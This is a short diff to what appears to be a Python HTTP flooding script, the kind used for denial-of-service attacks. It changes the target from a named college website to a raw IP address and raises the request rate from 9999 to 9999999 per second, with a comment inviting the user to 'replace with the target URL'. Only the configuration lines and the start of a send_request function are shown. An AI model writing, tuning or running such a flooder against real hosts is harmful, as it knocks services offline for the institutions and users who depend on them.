@@ -2,8 +2,8 @@ import requests
 import threading
 
 # Configuration
-url = 'http://pragati.rmkec.ac.in/'  # Replace with the target URL
-requests_per_second = 9999   # Number of requests to send per second   
+url = 'http://13.232.128.212/'  # Replace with the target URL
+requests_per_second = 9999999   # Number of requests to send per second   
 
 
 def send_request():
